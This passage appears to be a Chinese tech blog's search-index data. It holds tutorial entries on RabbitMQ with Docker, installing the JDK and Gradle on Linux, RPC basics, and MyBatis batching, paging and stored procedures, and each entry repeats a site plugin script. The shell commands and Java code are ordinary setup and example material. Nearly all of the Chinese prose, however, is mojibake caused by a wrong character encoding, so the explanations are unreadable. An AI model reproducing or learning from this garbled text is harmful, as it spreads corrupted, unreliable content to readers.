é•œåƒä¸å®¹å™¨ç®¡ç†å‘½ä»¤ï¼š 1234567891011# åˆ›å»ºå¹¶å¯åŠ¨RabbitMQå®¹å™¨# docker-compose up -d# æŸ¥çœ‹RabbitMQçš„è¿è¡ŒçŠ¶æ€# docker-compose ps# æŸ¥çœ‹RabbitMQçš„è¿è¡Œæ—¥å¿—# docker logs rabbitmq-3.8.14# æµè§ˆå™¨è®¿é—®RabbitMQçš„ç®¡ç†ç•Œé¢ï¼Œè®¿é—®åœ°å€å¦‚ä¸‹http://127.0.0.1:15672 å‚è€ƒèµ„æ–™ Docker å®˜æ–¹å®‰è£… RabbitMQ çš„æ•™ç¨‹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Linux å®‰è£… Gradle",url:"/posts/7b495a3f.html",text:'å‰è¨€æœ¬æ–‡é€‚ç”¨äº CentOS/Debian/Ubuntu ç­‰ Linux å‘è¡Œç‰ˆç³»ç»Ÿã€‚ JDK å®‰è£…ç”±äº Gradle çš„è¿è¡Œä¾èµ–äº JDKï¼Œä½†æ˜¯å®‰è£… Oracle JDK ä¸æ˜¯å¿…éœ€çš„ï¼Œå¦‚æœä¸æƒ³å®‰è£…å¯ä»¥ä½¿ç”¨ Open-JDK æ›¿ä»£ï¼Œè€Œä¸”å¤§å¤šæ•° Linux å‘è¡Œç‰ˆè‡ªå¸¦ Open-JDKã€‚ 1234567891011121314151617181920212223242526272829303132# ä¸‹è½½Oracle JDK8# wget -P /usr/local --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http%3a%2F%2Fwww.oracle.com%2Ftechnetwork%2Fjava%2Fjavase%2Fdownloads%2Fjdk8-downloads-2133151.html; oraclelicense=accept-securebackup-cookie;" "https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk1.8.0_201-linux-x64.tar.gz"# è§£å‹Oracle JDK8# tar -xvf /usr/local/jdk1.8.0_201-linux-x64.tar.gz# åˆ é™¤ä¸‹è½½æ–‡ä»¶# rm /usr/local/jdk1.8.0_201-linux-x64.tar.gz# å¦‚æœå·²å®‰è£…Open-JDKï¼Œåˆ™è¦†ç›–Javaå‘½ä»¤çš„è½¯é“¾æ¥# ln -s -f /usr/local/jdk1.8.0_201/bin/java /usr/bin/java# ln -s -f /usr/local/jdk1.8.0_201/bin/javac /usr/bin/javac# é…ç½®JDKçš„ç¯å¢ƒå˜é‡ï¼Œåœ¨é…ç½®æ–‡ä»¶æœ«å°¾è¿½åŠ ä»¥ä¸‹å†…å®¹å³å¯# vim /etc/profileJAVA_HOME=/usr/local/jdk1.8.0_201JRE_HOME=/usr/local/jdk1.8.0_201/jreCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME CLASSPATH PATH# ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ# source /etc/profile# éªŒè¯ç¯å¢ƒå˜é‡æ˜¯å¦ç”Ÿæ•ˆï¼Œå¦‚æœä¸ç”Ÿæ•ˆå»ºè®®é‡å¯ç³»ç»Ÿ# javac -versionjavac 1.8.0_201# java -versionjava version "1.8.0_201"Java(TM) SE Runtime Environment (build 1.8.0_201-b09)Java HotSpot(TM) 64-Bit Server VM (build 25.201-b09, mixed mode) Gradle ä¸‹è½½ Gradle å®˜æ–¹äºŒè¿›åˆ¶åŒ…ï¼ˆ binary-only ï¼‰ Gradle å®‰è£…1234567891011121314151617# ä¸‹è½½gradle# wget https://downloads.gradle.org/distributions/gradle-5.4.1-bin.zip# è§£å‹gradle# unzip -d /usr/local gradle-5.4.1-bin.zip# é…ç½®ç¯å¢ƒå˜é‡ï¼Œç¼–è¾‘/etc/profileæ–‡ä»¶åœ¨æœ«å°¾æ·»åŠ ä»¥ä¸‹é…ç½®å†…å®¹# vim /etc/profileGRADLE_HOME=/usr/local/gradle-5.4.1PATH=$PATH:$GRADLE_HOME/binexport GRADLE_HOME PATH# ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ# source /etc/profile# æŸ¥çœ‹Gradleæ˜¯å¦é…ç½®æˆåŠŸ# gradle -v var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Linux è¿ç»´çŸ¥è¯†å›¾è°± (æœ€æ–°)",url:"/posts/56039a80.html",text:'Linux è¿ç»´æŠ€æœ¯ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"çŸ¥è¯†å›¾è°±"},{title:"æµ…æ RPC è¿œç¨‹è¿‡ç¨‹è°ƒç”¨åŸºæœ¬åŸç†",url:"/posts/37f9ab5d.html",text:'RPC æ¡†æ¶çš„æ ¸å¿ƒ RPC çš„æ ¸å¿ƒæ¨¡å—ï¼š é€šè®¯ã€åºåˆ—åŒ– ä¸»æµçš„ RPC æ¡†æ¶ï¼š Dubboã€gRPCã€Thriftã€HSFã€Motanã€ZBUS RPC çš„åŸºæœ¬è°ƒç”¨åŸç† ä¸€æ¬¡å®Œæ•´çš„ RPC è°ƒç”¨æµç¨‹ï¼ˆåŒæ­¥è°ƒç”¨ï¼Œå¼‚æ­¥å¦è¯´ï¼‰å¦‚ä¸‹ï¼š1ï¼‰æœåŠ¡æ¶ˆè´¹æ–¹ï¼ˆclientï¼‰è°ƒç”¨ä»¥æœ¬åœ°è°ƒç”¨æ–¹å¼è°ƒç”¨æœåŠ¡ï¼›2ï¼‰client stub æ¥æ”¶åˆ°è°ƒç”¨åè´Ÿè´£å°†æ–¹æ³•ã€å‚æ•°ç­‰ç»„è£…æˆèƒ½å¤Ÿè¿›è¡Œç½‘ç»œä¼ è¾“çš„æ¶ˆæ¯ä½“ï¼›3ï¼‰client stub æ‰¾åˆ°æœåŠ¡åœ°å€ï¼Œå¹¶å°†æ¶ˆæ¯å‘é€åˆ°æœåŠ¡ç«¯ï¼›4ï¼‰server stub æ”¶åˆ°æ¶ˆæ¯åè¿›è¡Œè§£ç ï¼›5ï¼‰server stub æ ¹æ®è§£ç ç»“æœè°ƒç”¨æœ¬åœ°çš„æœåŠ¡ï¼›6ï¼‰æœ¬åœ°æœåŠ¡æ‰§è¡Œå¹¶å°†ç»“æœè¿”å›ç»™ server stubï¼›7ï¼‰server stub å°†è¿”å›ç»“æœæ‰“åŒ…æˆæ¶ˆæ¯å¹¶å‘é€è‡³æ¶ˆè´¹æ–¹ï¼›8ï¼‰client stub æ¥æ”¶åˆ°æ¶ˆæ¯ï¼Œå¹¶è¿›è¡Œè§£ç ï¼›9ï¼‰æœåŠ¡æ¶ˆè´¹æ–¹å¾—åˆ°æœ€ç»ˆç»“æœã€‚RPC æ¡†æ¶çš„ç›®æ ‡å°±æ˜¯è¦ 2~8 è¿™äº›æ­¥éª¤éƒ½å°è£…èµ·æ¥ï¼Œè¿™äº›ç»†èŠ‚å¯¹ç”¨æˆ·æ¥è¯´æ˜¯é€æ˜çš„ï¼Œä¸å¯è§çš„ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼"},{title:"MyBatis å…¥é—¨æ•™ç¨‹ä¹‹å…«",url:"/posts/9ed8a349.html",text:'MyBatis å®ç”¨åœºæ™¯MyBatis æ‰¹é‡æ“ä½œè°ƒç”¨ä¸å¸¦å‚æ•°çš„ openSession() æ–¹æ³•æ—¶ï¼Œåˆ›å»ºçš„ SqlSession å¯¹è±¡å…·æœ‰å¦‚ä¸‹ç‰¹æ€§ï¼š ä¼šå¼€å¯ä¸€ä¸ªäº‹åŠ¡ï¼ˆä¸ä¼šè‡ªåŠ¨æäº¤ï¼‰ æ•°æ®åº“è¿æ¥å¯¹è±¡ä¼šä»ç”±ç¯å¢ƒé…ç½®çš„æ•°æ®æºå®ä¾‹å¾—åˆ° äº‹åŠ¡éš”ç¦»çº§åˆ«å°†ä¼šä½¿ç”¨é©±åŠ¨æˆ–æ•°æ®æºçš„é»˜è®¤é…ç½® é¢„å¤„ç†è¯­å¥ä¸ä¼šè¢«å¤ç”¨ï¼Œä¹Ÿä¸ä¼šæ‰¹é‡å¤„ç†æ›´æ–° å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒopenSession() æ–¹æ³•çš„ ExecutorType ç±»å‹çš„å‚æ•°æ˜¯æšä¸¾ç±»å‹ï¼Œå–å€¼å¦‚ä¸‹ï¼š SIMPLEï¼šè¿™ä¸ªæ‰§è¡Œå™¨ç±»å‹ä¸åšç‰¹æ®Šçš„äº‹æƒ…ï¼ˆé»˜è®¤æ‰§è¡Œå™¨ï¼‰ï¼Œå®ƒä¼šä¸ºæ¯ä¸ª SQL è¯­å¥çš„æ‰§è¡Œåˆ›å»ºä¸€ä¸ªæ–°çš„é¢„å¤„ç†è¯­å¥ã€‚ REUSEï¼šè¿™ä¸ªæ‰§è¡Œå™¨ç±»å‹ä¼šå¤ç”¨é¢„å¤„ç†è¯­å¥ã€‚ BATCHï¼šè¿™ä¸ªæ‰§è¡Œå™¨ä¼šæ‰¹é‡æ‰§è¡Œæ‰€æœ‰æ›´æ–°è¯­å¥ã€‚ æ‰¹é‡æ“ä½œä»‹ç»æ‰¹é‡æ“ä½œå°±æ˜¯ä½¿ç”¨ MyBatis æä¾›çš„ BATCH ç±»å‹çš„ Executor è¿›è¡Œçš„ï¼Œå®ƒçš„åº•å±‚æ˜¯é€šè¿‡ JDBC æš‚å­˜ SQL è¯­å¥çš„æ–¹å¼æ¥å®ç°ï¼Œä¹Ÿå°±æ˜¯ä¿å­˜ SQL è¯­å¥åˆ°ä¸€å®šæ•°é‡åå†å‘ç»™æ•°æ®åº“æ‰§è¡Œä¸€æ¬¡ã€‚MyBatis ä¸ Spring æ•´åˆæ—¶ï¼Œæ¨èé¢å¤–é…ç½®ä¸€ä¸ªå¯ä»¥ä¸“é—¨ç”¨æ¥æ‰§è¡Œæ‰¹é‡æ“ä½œçš„ SqlSessionï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ã€‚å½“éœ€è¦ä½¿ç”¨æ‰¹é‡æ“ä½œçš„æ—¶å€™ï¼Œå¯ä»¥åœ¨ Service å±‚æ³¨å…¥å¯æ‰¹é‡æ“ä½œçš„ SqlSessionï¼Œç„¶åé€šè¿‡å®ƒè·å– Mapper æ˜ å°„å™¨æ¥æ“ä½œæ•°æ®åº“ã€‚ 1234&lt;bean id="sqlSession" class="org.mybatis.spring.SqlSessionTemplate"&gt; &lt;constructor-arg name="executorType" value="BATCH" /&gt; &lt;constructor-arg name="sqlSessionFactory" ref="sqlSessionFactoryBean" /&gt;&lt;/bean&gt; ç‰¹åˆ«æ³¨æ„ å½“ ExecutorType æŒ‡å®šä¸º BATCH åï¼Œæ‰§è¡Œå¢åˆ æ”¹æ“ä½œä¸ä¼šå†è¿”å›æ­£ç¡®çš„å—å½±å“çš„è®°å½•æ•°ã€‚ æ‰¹é‡æ“ä½œæ˜¯åœ¨ session.commit() æ‰§è¡Œä»¥åæ‰å‘é€ SQL è¯­å¥ç»™æ•°æ®åº“æ‰§è¡Œçš„ã€‚è‹¥æƒ³è®©å…¶æå‰æ‰§è¡Œï¼Œä»¥æ–¹ä¾¿åç»­çš„æŸ¥è¯¢æ“ä½œå¯ä»¥è·å–åˆ°æ•°æ®ï¼Œåˆ™å¯ä»¥è°ƒç”¨ sqlSession.flushStatements() æ–¹æ³•ï¼Œè®©å…¶ç›´æ¥å†²åˆ·åˆ°æ•°æ®åº“è¿›è¡Œæ‰§è¡Œã€‚ æ‰¹é‡æ“ä½œä½¿ç”¨æ¡ˆä¾‹æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-22ã€‚ Mapper æ¥å£ 12345public interface EmployeeMapper { public boolean addEmp(Employee employee);} SQL æ˜ å°„æ–‡ä»¶ 12345678&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;insert id="addEmp" parameterType="com.clay.mybatis.bean.Employee"&gt; insert into t_employee (last_name, gender, email) values(#{lastName}, #{gender}, #{email}) &lt;/insert&gt;&lt;/mapper&gt; æ‰¹é‡æ“ä½œ 1234567891011121314151617181920212223242526public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); // æ‰¹é‡æ“ä½œï¼šè®¾ç½®æ‰§è¡Œå™¨çš„ç±»å‹ä¸º BATCH SqlSession session = sqlSessionFactory.openSession(ExecutorType.BATCH); try { EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); for (int i = 0; i &lt; 10; i++) { Employee employee = new Employee("employe-" + i, "1", "employe@gmail.com"); mapper.addEmp(employee); } session.commit(); } finally { if (session != null) { session.close(); } } }} æ‰§è¡Œç»“æœ 12345678910111213141516171821:25:28,897 DEBUG JdbcTransaction:137 - Opening JDBC Connection21:25:29,120 DEBUG PooledDataSource:434 - Created connection 706895319.21:25:29,120 DEBUG JdbcTransaction:101 - Setting autocommit to false on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@2a225dd7]21:25:29,124 DEBUG addEmp:137 - ==&gt; Preparing: insert into t_employee (last_name, gender, email) values(?, ?, ?)21:25:29,165 DEBUG addEmp:137 - ==&gt; Parameters: employe-0(String), 1(String), employe@gmail(String)21:25:29,166 DEBUG addEmp:137 - ==&gt; Parameters: employe-1(String), 1(String), employe@gmail(String)21:25:29,166 DEBUG addEmp:137 - ==&gt; Parameters: employe-2(String), 1(String), employe@gmail(String)21:25:29,167 DEBUG addEmp:137 - ==&gt; Parameters: employe-3(String), 1(String), employe@gmail(String)21:25:29,167 DEBUG addEmp:137 - ==&gt; Parameters: employe-4(String), 1(String), employe@gmail(String)21:25:29,168 DEBUG addEmp:137 - ==&gt; Parameters: employe-5(String), 1(String), employe@gmail(String)21:25:29,168 DEBUG addEmp:137 - ==&gt; Parameters: employe-6(String), 1(String), employe@gmail(String)21:25:29,170 DEBUG addEmp:137 - ==&gt; Parameters: employe-7(String), 1(String), employe@gmail(String)21:25:29,170 DEBUG addEmp:137 - ==&gt; Parameters: employe-8(String), 1(String), employe@gmail(String)21:25:29,170 DEBUG addEmp:137 - ==&gt; Parameters: employe-9(String), 1(String), employe@gmail(String)21:25:29,174 DEBUG JdbcTransaction:70 - Committing JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@2a225dd7]21:25:29,177 DEBUG JdbcTransaction:123 - Resetting autocommit to true on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@2a225dd7]21:25:29,177 DEBUG JdbcTransaction:91 - Closing JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@2a225dd7]21:25:29,178 DEBUG PooledDataSource:391 - Returned connection 706895319 to pool. è§‚å¯Ÿä¸Šé¢çš„æ‰§è¡Œç»“æœï¼Œå¯ä»¥å‘ç°ä½¿ç”¨ MyBatis çš„æ‰¹é‡æ“ä½œæ’å…¥å¤šæ¡æ•°æ®æ—¶ï¼Œä¸ä¼šå‘é€å¤šæ¡ SQL è¯­å¥åˆ°æ•°æ®åº“ï¼Œè¿™å¤§å¤§æé«˜äº†ä¸šåŠ¡é€»è¾‘çš„æ‰§è¡Œæ•ˆç‡ã€‚ PageHelper åˆ†é¡µæ’ä»¶PageHelper æ˜¯ MyBatis ç¬¬ä¸‰æ–¹çš„åˆ†é¡µæ’ä»¶ï¼Œæ”¯æŒä»»ä½•å¤æ‚çš„å•è¡¨ã€å¤šè¡¨åˆ†é¡µæŸ¥è¯¢ï¼Œéƒ¨åˆ†ç‰¹æ®Šæƒ…å†µè¯·çœ‹é‡è¦æç¤ºã€‚ PageHelper å®˜æ–¹æ–‡æ¡£ PageHelper ä½¿ç”¨æ–¹æ³• PageHelper API æ–‡æ¡£ PageHelper ä½¿ç”¨æ¡ˆä¾‹æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-21ã€‚ å¼•å…¥ä¾èµ– 12345&lt;dependency&gt; &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt; &lt;artifactId&gt;pagehelper&lt;/artifactId&gt; &lt;version&gt;5.3.1&lt;/version&gt;&lt;/dependency&gt; æ³¨å†Œæ’ä»¶ 1234567&lt;configuration&gt; &lt;plugins&gt; &lt;plugin interceptor="com.github.pagehelper.PageInterceptor" /&gt; &lt;/plugins&gt;&lt;/configuration&gt; Mapper æ¥å£ 12345public interface EmployeeMapper { public List&lt;Employee&gt; getEmps();} SQL æ˜ å°„æ–‡ä»¶ æç¤º åœ¨ç¼–å†™ SQL è¯­å¥çš„æ—¶å€™ï¼Œä¸éœ€è¦æ‰‹åŠ¨æŒ‡å®šä»»ä½•åˆ†é¡µå‚æ•°ã€‚ 12345678&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmps" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee &lt;/select&gt;&lt;/mapper&gt; ä¸šåŠ¡é€»è¾‘ï¼ŒPageHelper æ›´å¤š API çš„ä½¿ç”¨ç¤ºä¾‹å¯ä»¥çœ‹ è¿™é‡Œ 1234567891011121314151617181920212223242526272829303132333435public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { // è®¾ç½®åˆ†é¡µä¿¡æ¯ Page&lt;Object&gt; page = PageHelper.startPage(2, 2); // æ•°æ®åº“æŸ¥è¯¢ EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); List&lt;Employee&gt; employees = mapper.getEmps(); System.out.println(employees); // è·å–åˆ†é¡µä¿¡æ¯ PageInfo&lt;Object&gt; pageInfo = page.toPageInfo(); System.out.println("æ€»é¡µæ•°ï¼š " + pageInfo.getPages()); System.out.println("æ€»è®°å½•æ•°ï¼š " + pageInfo.getTotal()); System.out.println("å½“å‰çš„é¡µç ï¼š " + pageInfo.getPageNum()); System.out.println("å½“å‰çš„è®°å½•æ•°ï¼š " + pageInfo.getSize()); System.out.println("æ¯é¡µçš„è®°å½•æ•°ï¼š " + pageInfo.getPageSize()); System.out.println("æ˜¯å¦æœ‰ä¸‹ä¸€é¡µï¼š " + pageInfo.isHasNextPage()); System.out.println("æ˜¯å¦ä¸ºç¬¬ä¸€é¡µï¼š " + pageInfo.isIsFirstPage()); System.out.println("æ˜¯å¦ä¸ºæœ€åä¸€é¡µï¼š " + pageInfo.isIsLastPage()); } finally { if (session != null) { session.close(); } } }} æ‰§è¡Œç»“æœ 12345678910111213141523:16:35,705 DEBUG getEmps_COUNT:137 - ==&gt; Preparing: SELECT count(0) FROM t_employee23:16:35,763 DEBUG getEmps_COUNT:137 - ==&gt; Parameters: 23:16:35,802 DEBUG getEmps_COUNT:137 - &lt;== Total: 123:16:35,807 DEBUG getEmps:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee LIMIT ?, ?23:16:35,810 DEBUG getEmps:137 - ==&gt; Parameters: 2(Long), 2(Integer)23:16:35,812 DEBUG getEmps:137 - &lt;== Total: 1Page{count=true, pageNum=2, pageSize=2, startRow=2, endRow=4, total=3, pages=2, reasonable=false, pageSizeZero=false}[4_Tom_1_tom@gmail.com]æ€»é¡µæ•°ï¼š 2æ€»è®°å½•æ•°ï¼š 3å½“å‰çš„é¡µç ï¼š 2å½“å‰çš„è®°å½•æ•°ï¼š 1æ¯é¡µçš„è®°å½•æ•°ï¼š 2æ˜¯å¦æœ‰ä¸‹ä¸€é¡µï¼š falseæ˜¯å¦ä¸ºç¬¬ä¸€é¡µï¼š falseæ˜¯å¦ä¸ºæœ€åä¸€é¡µï¼š true MyBatis è°ƒç”¨å­˜å‚¨è¿‡ç¨‹å­˜å‚¨è¿‡ç¨‹ï¼ˆStored Procedureï¼‰æ˜¯ä¸€ç§å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„å¤æ‚ç¨‹åºï¼Œä»¥ä¾¿å¤–éƒ¨ç¨‹åºè°ƒç”¨çš„ä¸€ç§æ•°æ®åº“å¯¹è±¡ã€‚å­˜å‚¨è¿‡ç¨‹æ˜¯ä¸ºäº†å®Œæˆç‰¹å®šåŠŸèƒ½çš„ SQL è¯­å¥é›†ï¼Œç»ç¼–è¯‘åˆ›å»ºå¹¶ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œç”¨æˆ·å¯é€šè¿‡æŒ‡å®šå­˜å‚¨è¿‡ç¨‹çš„åç§°å¹¶ç»™å®šå‚æ•°ï¼ˆéœ€è¦æ—¶ï¼‰æ¥è°ƒç”¨æ‰§è¡Œã€‚å­˜å‚¨è¿‡ç¨‹çš„è®¾è®¡æ€æƒ³å¾ˆç®€å•ï¼Œæœ¬è´¨å°±æ˜¯æ•°æ®åº“ SQL è¯­è¨€å±‚é¢çš„ä»£ç å°è£…ä¸é‡ç”¨ã€‚ å­˜å‚¨è¿‡ç¨‹çš„ä¼˜ç¼ºç‚¹å­˜å‚¨è¿‡ç¨‹çš„ä¼˜ç‚¹ï¼š æå¤§åœ°æé«˜ SQL è¯­è¨€çš„åŠŸèƒ½å’Œçµæ´»æ€§ å¯ä¿è¯æ•°æ®çš„å®‰å…¨æ€§å’Œå®Œæ•´æ€§ é€šè¿‡å­˜å‚¨è¿‡ç¨‹å¯ä»¥ä½¿ç›¸å…³çš„åŠ¨ä½œåœ¨ä¸€èµ·å‘ç”Ÿï¼Œä»è€Œå¯ä»¥ç»´æŠ¤æ•°æ®åº“çš„å®Œæ•´æ€§ é€šè¿‡å­˜å‚¨è¿‡ç¨‹å¯ä»¥ä½¿æ²¡æœ‰æƒé™çš„ç”¨æˆ·åœ¨æ§åˆ¶ä¹‹ä¸‹é—´æ¥åœ°å­˜å–æ•°æ®åº“ï¼Œä»è€Œä¿è¯æ•°æ®çš„å®‰å…¨ æå¤§åœ°æ”¹å–„ SQL è¯­å¥çš„æ€§èƒ½ åœ¨è¿è¡Œå­˜å‚¨è¿‡ç¨‹å‰ï¼Œæ•°æ®åº“å·²å¯¹å…¶è¿›è¡Œäº†è¯­æ³•å’Œå¥æ³•åˆ†æï¼Œå¹¶ç»™å‡ºä¼˜åŒ–æ‰§è¡Œæ–¹æ¡ˆï¼Œè¿™ç§å·²ç»ç¼–è¯‘å¥½çš„è¿‡ç¨‹å¯æå¤§åœ°æ”¹å–„ SQL è¯­å¥çš„æ€§èƒ½ã€‚ç”±äºæ‰§è¡Œ SQL è¯­å¥çš„å¤§éƒ¨åˆ†è§£æå·¥ä½œå·²ç»å®Œæˆï¼Œæ‰€ä»¥å­˜å‚¨è¿‡ç¨‹èƒ½ä»¥æå¿«çš„é€Ÿåº¦æ‰§è¡Œ å¯ä»¥é™ä½ç½‘ç»œçš„é€šä¿¡é‡ å®¢æˆ·ç«¯è°ƒç”¨å­˜å‚¨è¿‡ç¨‹æ—¶ï¼Œåªéœ€è¦ä¼ å­˜å‚¨è¿‡ç¨‹åå’Œç›¸å…³å‚æ•°å³å¯ï¼Œä¸ä¼ è¾“ SQL è¯­å¥ç›¸æ¯”è‡ªç„¶æ•°æ®é‡å°‘äº†å¾ˆå¤š å­˜å‚¨è¿‡ç¨‹çš„ç¼ºç‚¹ï¼š å¼€å‘é˜¶æ®µéš¾ä»¥è°ƒè¯• éš¾ä»¥ç§»æ¤ï¼Œå­˜å‚¨è¿‡ç¨‹å¾€å¾€å®šåˆ¶åŒ–äºç‰¹å®šçš„æ•°æ®åº“ä¸Šï¼Œå½“åˆ‡æ¢åˆ°å…¶ä»–å‚å•†çš„æ•°æ®åº“ç³»ç»Ÿæ—¶ï¼Œå¾€å¾€éœ€è¦é‡å†™åŸæœ‰çš„å­˜å‚¨è¿‡ç¨‹ å¦‚æœåœ¨ä¸€ä¸ªç³»ç»Ÿä¸­å¤§é‡çš„ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹ï¼Œåˆ°ç¨‹åºäº¤ä»˜ä½¿ç”¨çš„æ—¶å€™ï¼Œéšç€ç”¨æˆ·éœ€æ±‚çš„å¢åŠ ä¼šå¯¼è‡´æ•°æ®ç»“æ„çš„å˜åŒ–ï¼Œå­˜å‚¨è¿‡ç¨‹ä¹Ÿè¦åŒæ­¥æ›´æ–°ã€‚æœ€åå¦‚æœç”¨æˆ·æƒ³ç»´æŠ¤è¯¥ç³»ç»Ÿå¯ä»¥è¯´æ˜¯å¾ˆéš¾çš„ï¼Œè€Œä¸”ä»£ä»·æ˜¯ç©ºå‰çš„ï¼Œç»´æŠ¤èµ·æ¥æ›´éº»çƒ¦ MySQL å­˜å‚¨è¿‡ç¨‹çš„è¯­æ³• å£°æ˜è¯­å¥ç»“æŸç¬¦ 12345delimiter $$æˆ–è€…delimiter // å£°æ˜å­˜å‚¨è¿‡ç¨‹ 1create procedure demo_in_parameter(in p_in int) å­˜å‚¨è¿‡ç¨‹çš„å¼€å§‹å’Œç»“æŸç¬¦å· 1begin .... end å˜é‡å®šä¹‰ 1declare l_int int unsigned default 4000000; å˜é‡èµ‹å€¼ 1set @p_in=1 è°ƒç”¨å­˜å‚¨è¿‡ç¨‹ 1call demo_in_parameter(); åˆ é™¤å­˜å‚¨è¿‡ç¨‹ 1drop procedure demo_in_parameter; åˆ›å»ºå­˜å‚¨è¿‡ç¨‹ï¼ˆå®Œæ•´çš„ï¼‰ 123456delimiter $$create procedure datetime()BEGIN select now();END $$delimiter ; å­˜å‚¨è¿‡ç¨‹è°ƒç”¨æ¡ˆä¾‹æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-23ã€‚ æç¤º è‹¥éœ€è¦è°ƒç”¨å­˜å‚¨è¿‡ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ &lt;select&gt; æ ‡ç­¾ï¼Œå¹¶è®¾ç½®æ ‡ç­¾çš„ statementType å±æ€§ä¸º CALLABLE å³å¯ &lt;select&gt; æ ‡ç­¾ä½“ä¸­å­˜å‚¨è¿‡ç¨‹çš„è°ƒç”¨è¯­æ³•ï¼š { call procedure_name(#{param1_info}, #{param2_info}) } MySQL å­˜å‚¨è¿‡ç¨‹è°ƒç”¨æ¡ˆä¾‹ä¸€åœ¨ä¸‹é¢çš„æ¡ˆä¾‹ä¸­ï¼Œæ¼”ç¤ºäº†å¦‚ä½•åœ¨ MySQL æ•°æ®åº“ä¸­ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹æ¥æ ¹æ®å‘˜å·¥ ID æŸ¥è¯¢å‘˜å·¥çš„è¯¦ç»†ä¿¡æ¯ã€‚ JavaBean ç±» 12345678public class Employee { private Long id; private String lastName; private String gender; private String email;} Mapper æ¥å£ 12345public interface 